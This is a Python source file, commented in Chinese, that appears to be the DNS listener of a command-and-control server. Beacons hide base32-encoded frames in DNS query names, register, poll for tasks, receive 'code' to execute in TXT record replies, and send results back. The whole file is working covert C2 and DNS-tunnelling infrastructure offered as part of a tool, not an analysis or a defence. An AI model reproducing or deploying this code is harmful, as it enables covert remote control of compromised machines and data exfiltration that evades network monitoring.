"""server/infra/dns_listener.py — DNS 传输监听器（f8 基础版）。

beacon 把帧数据 base32 编码进 A 查询域名（无状态，fire-and-forget）：
  <b32(帧数据)|poll>.<bid>.<mode>.<tunnel-domain>
server 把响应帧 base32 分片为多条 TXT 记录回给 beacon。
请求方向限小块（域名 253 字符上限），响应方向 TXT 多片不受限。

与 HTTPS transport 同一套无状态协议逻辑（register / result / 轮询）。
"""

import base64
import json
import socket
import struct
import threading
import time

from server.core.crypto import encode_frame, decode_frame
from server.core.protocol import (REGISTER, RESULT, WELCOME, PONG, TASK,
                                  validate_message, BAD_JSON)
from server.core.events import EVT_CONNECT, EVT_TASK_RESULT
from server.client_manager import TaskResult

_CACHE_TTL = 60.0     # 分片缓存存活上限（M2）
_CACHE_MAX = 512      # 分片缓存条目上限（M2：防内存耗尽）


def _b32e(data: bytes) -> str:
    return base64.b32encode(data).decode("ascii").rstrip("=")


def _b32d(s: str) -> bytes:
    pad = "=" * (-len(s) % 8)
    return base64.b32decode(s + pad)


def parse_query(packet: bytes):
    """解析 DNS 查询，返回 (qid, labels, qtype) 或 None。"""
    if len(packet) < 12:
        return None
    qid = packet[:2]
    flags = struct.unpack(">H", packet[2:4])[0]
    if (flags >> 15) != 0:
        return None  # 非查询
    qd = struct.unpack(">H", packet[4:6])[0]
    if qd == 0:
        return None
    off = 12
    labels = []
    while off < len(packet):
        ln = packet[off]
        if ln == 0:
            off += 1
            break
        if ln & 0xC0:
            return None  # 查询不应有压缩指针
        off += 1
        labels.append(packet[off:off + ln].decode("ascii", "replace"))
        off += ln
    if off + 4 > len(packet):
        return None
    qtype, _qclass = struct.unpack(">HH", packet[off:off + 4])
    return qid, labels, qtype


def build_txt_response(qid: bytes, labels: list, qtype: int,
                       txt_chunks: list) -> bytes:
    """构造 DNS 响应：question 原样 + 多条 TXT RR（分片）。"""
    qname = b"".join(bytes([len(p)]) + p.encode("ascii") for p in labels) + b"\x00"
    flags = 0x8180
    header = qid + struct.pack(">HHHHH", flags, 1, len(txt_chunks), 0, 0)
    answer = b""
    for chunk in txt_chunks:
        rdata = bytes([len(chunk)]) + chunk  # TXT rdata: length-prefixed
        answer += (b"\xc0\x0c" + struct.pack(">HHI", 16, 1, 60)
                   + struct.pack(">H", len(rdata)) + rdata)
    return header + qname + struct.pack(">HH", qtype, 1) + answer


class _DnsServer:
    """UDP DNS 服务：解析查询 → 无状态协议处理 → TXT 响应。"""

    def __init__(self, host, port, key, mgr, tq, events):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((host, port))
        self._sock.settimeout(1.0)
        self._key = key
        self._mgr = mgr
        self._tq = tq
        self._events = events
        self._cache = {}            # 分片请求缓存: bid -> {seq: seg}
        self._running = False
        self._thread = threading.Thread(target=self._loop, daemon=True)

    def _frame(self, msg: dict) -> bytes:
        payload = encode_frame(json.dumps(msg).encode("utf-8"), self._key)
        return struct.pack(">I", len(payload)) + payload

    def _handle(self, packet: bytes) -> bytes:
        parsed = parse_query(packet)
        if not parsed:
            return b""
        qid, labels, qtype = parsed
        if len(labels) < 3:
            return build_txt_response(qid, labels, qtype, [b""])

        # 轮询：poll.<bid>.<domain...>
        if labels[0] == "poll":
            bid = labels[1]
            resp = self._frame({"type": PONG})
            if bid and bid != "poll":
                task = self._tq.pop(bid)
                if task is not None:
                    resp = self._frame(
                        {"type": TASK, "task_id": task.task_id,
                         "code": task.code})
            return self._txt_response(qid, labels, qtype, resp)

        # 数据分片: <seg>.<seq>.<total>.<bid>.<domain...>
        try:
            seg, seq_s, total_s, bid = labels[0], labels[1], labels[2], labels[3]
            seq, total = int(seq_s), int(total_s)
        except (ValueError, IndexError):
            return build_txt_response(qid, labels, qtype, [b""])
        now = time.time()
        # M2：惰性清理过期缓存 + 条目上限（防攻击者用不完整分片耗尽内存）
        if len(self._cache) > _CACHE_MAX:
            stale = [b for b, c in self._cache.items()
                     if now - c[0] > _CACHE_TTL]
            for b in stale:
                self._cache.pop(b, None)
        cache = self._cache.setdefault(bid, (now, {}))
        if now - cache[0] > _CACHE_TTL:
            cache = self._cache[bid] = (now, {})   # 过期重置
        cache[1][seq] = seg
        if len(cache[1]) < total:
            # 确认收到，无数据（beacon 端继续发剩余分片）
            return build_txt_response(qid, labels, qtype, [b""])
        full = "".join(cache[1][i] for i in range(total))
        self._cache.pop(bid, None)
        try:
            raw = _b32d(full)
            msg = json.loads(decode_frame(raw[4:], self._key)
                             .decode("utf-8"))
        except Exception:
            return build_txt_response(qid, labels, qtype, [b""])
        # M3：与 TCP 通道一致的整帧校验（此前 DNS 无校验）
        if validate_message(msg):
            return build_txt_response(qid, labels, qtype, [b""])

        if msg.get("type") == REGISTER:
            bid2, is_new = self._mgr.register(
                msg.get("id", ""), is_client=False)
            self._events.emit(EVT_CONNECT, bid2, first=bool(is_new))
            resp = self._frame({"type": WELCOME, "version": 1})
        elif msg.get("type") == RESULT:
            self._mgr.add_result(bid, TaskResult(
                task_id=msg.get("task_id", ""),
                output=msg.get("output", ""),
                error=msg.get("error", "")))
            self._events.emit(EVT_TASK_RESULT, bid,
                              task_id=msg.get("task_id", ""),
                              output=str(msg.get("output", ""))[:200])
            resp = self._frame({"type": PONG})
        else:
            resp = self._frame({"type": PONG})
        return self._txt_response(qid, labels, qtype, resp)

    def _txt_response(self, qid, labels, qtype, resp_frame: bytes) -> bytes:
        """响应帧 → base32 分片 → 多条 TXT RR。"""
        b32 = _b32e(resp_frame)
        chunks = [b32[i:i + 60].encode("ascii")
                  for i in range(0, len(b32), 60)]
        return build_txt_response(qid, labels, qtype, chunks or [b""])

    def _loop(self):
        while self._running:
            try:
                packet, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                resp = self._handle(packet)
            except Exception:
                resp = b""
            if resp:
                try:
                    self._sock.sendto(resp, addr)
                except OSError:
                    pass

    def start(self):
        self._running = True
        self._thread.start()

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except OSError:
            pass
        self._thread.join(timeout=3)
